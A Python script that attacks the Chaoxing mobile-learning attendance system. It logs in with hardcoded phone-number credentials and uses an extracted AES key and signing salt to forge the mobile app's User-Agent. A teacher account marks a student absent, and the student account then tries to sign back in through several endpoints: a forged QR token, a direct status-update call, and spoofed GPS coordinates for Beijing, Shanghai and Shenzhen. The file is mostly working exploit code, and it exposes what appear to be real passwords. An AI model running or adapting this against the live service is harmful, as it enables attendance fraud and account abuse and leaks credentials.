#!/usr/bin/env python3
"""
终极测试: 先把学生设为缺勤，然后测试学生能否通过各种方式重新签到
"""
import base64, hashlib, json, uuid, requests, urllib3, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"学生puid={puid_s}, 教师puid={puid_t}")

# 选择几个不同类型的签到活动进行测试
test_activities = {
    "5000163891319": "二维码签到(已结束)",
    "5000163767353": "普通签到(已结束)",
    "5000139505593": "位置签到(已结束)",
    "5000139410338": "手势签到(已结束)",
}

for aid, desc in test_activities.items():
    print(f"\n{'=' * 80}")
    print(f"测试活动: aid={aid} ({desc})")
    print(f"{'=' * 80}")

    # Step 1: 查询当前状态
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    original_status = get_status(d)
    original_update = d.get("data", {}).get("updatetime") if isinstance(d.get("data"), dict) else None
    print(f"  原始状态: status={original_status}, updatetime={original_update}")

    # Step 2: 教师设为缺勤
    r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                 data={"uids": puid_s, "status": "0", "remark": ""},
                 headers=ajax_hdr, timeout=20)
    print(f"  教师设为缺勤: {r.text[:100]}")

    time.sleep(2)

    # 验证
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    after_absent = get_status(d)
    print(f"  设为缺勤后: status={after_absent}")

    # Step 3: 学生尝试各种方式签到
    print(f"\n  --- 学生尝试签到 ---")

    # 3a: stuSignajax(标准)
    r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                 data={"activeId": aid, "uid": puid_s, "clientip": "",
                       "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0"},
                 headers=ajax_hdr, timeout=20)
    print(f"  stuSignajax(标准): {r.text[:150]}")

    time.sleep(1)
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    s1 = get_status(d)
    if s1 == 1:
        print(f"  *** stuSignajax签到成功！***")
    else:
        print(f"  stuSignajax后: status={s1}")

    # 3b: stuSignajax(带位置)
    r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                 data={"activeId": aid, "uid": puid_s, "clientip": "",
                       "latitude": "39.908823", "longitude": "116.397470",
                       "appType": "15", "fid": "0", "address": "北京市天安门广场"},
                 headers=ajax_hdr, timeout=20)
    print(f"  stuSignajax(位置): {r.text[:150]}")

    time.sleep(1)
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    s2 = get_status(d)
    if s2 == 1 and s1 != 1:
        print(f"  *** stuSignajax(位置)签到成功！***")
    elif s2 != s1:
        print(f"  stuSignajax(位置)后: status={s2}")

    # 3c: newsign/updateSignStatus
    r = s_s.post(f"{BASE}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                 data={"uids": puid_s, "status": "1", "remark": "",
                       "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
                 headers=ajax_hdr, timeout=20)
    print(f"  newsign/updateSignStatus: {r.text[:100]}")

    time.sleep(1)
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    s3 = get_status(d)
    if s3 == 1 and s2 != 1:
        print(f"  *** newsign/updateSignStatus签到成功！***")
    elif s3 != s2:
        print(f"  newsign后: status={s3}")

    # 3d: updateqrstatus(伪造enc)
    r = s_s.get(f"{BASE}/pptSign/updateqrstatus",
                params={"activeId": aid, "uid": puid_s, "enc": "test"},
                timeout=20)
    print(f"  updateqrstatus: HTTP {r.status_code}, {r.text[:100]}")

    time.sleep(1)
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    s4 = get_status(d)
    if s4 == 1 and s3 != 1:
        print(f"  *** updateqrstatus签到成功！***")

    # Step 4: 恢复原始状态
    if original_status is not None:
        r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                     data={"uids": puid_s, "status": str(original_status), "remark": ""},
                     headers=ajax_hdr, timeout=20)
        print(f"\n  恢复状态: {r.text[:100]}")

    print(f"\n  最终结果: 原始={original_status} -> 缺勤={after_absent} -> stuSignajax={s1} -> 位置={s2} -> newsign={s3} -> qrstatus={s4}")

# ======================================================================
# 额外测试: 位置签到 - 伪造远距离位置
# ======================================================================
print(f"\n{'=' * 80}")
print("位置签到伪造测试 - 先设缺勤再伪造位置")
print(f"{'=' * 80}")

location_aid = "5000139505593"

# 设为缺勤
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
             data={"uids": puid_s, "status": "0", "remark": ""},
             headers=ajax_hdr, timeout=20)
print(f"  设为缺勤: {r.text[:100]}")

time.sleep(2)

# 伪造远距离位置
fake_locations = [
    ("39.908823", "116.397470", "北京市天安门广场"),  # 北京
    ("31.230416", "121.473701", "上海市外滩"),        # 上海
    ("22.543099", "114.057868", "深圳市市民中心"),     # 深圳
]

for lat, lng, addr in fake_locations:
    r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                 data={"activeId": location_aid, "uid": puid_s, "clientip": "",
                       "latitude": lat, "longitude": lng, "appType": "15", "fid": "0",
                       "address": addr},
                 headers=ajax_hdr, timeout=20)
    print(f"  伪造位置({addr}): {r.text[:150]}")

    time.sleep(1)
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": location_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    st = get_status(d)
    if st == 1:
        print(f"  *** 位置签到伪造成功！地址={addr} ***")
        break
    else:
        print(f"  签到失败, status={st}")

# 恢复
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
             data={"uids": puid_s, "status": "1", "remark": ""},
             headers=ajax_hdr, timeout=20)
print(f"  恢复出勤: {r.text[:100]}")

print("\n测试完成")
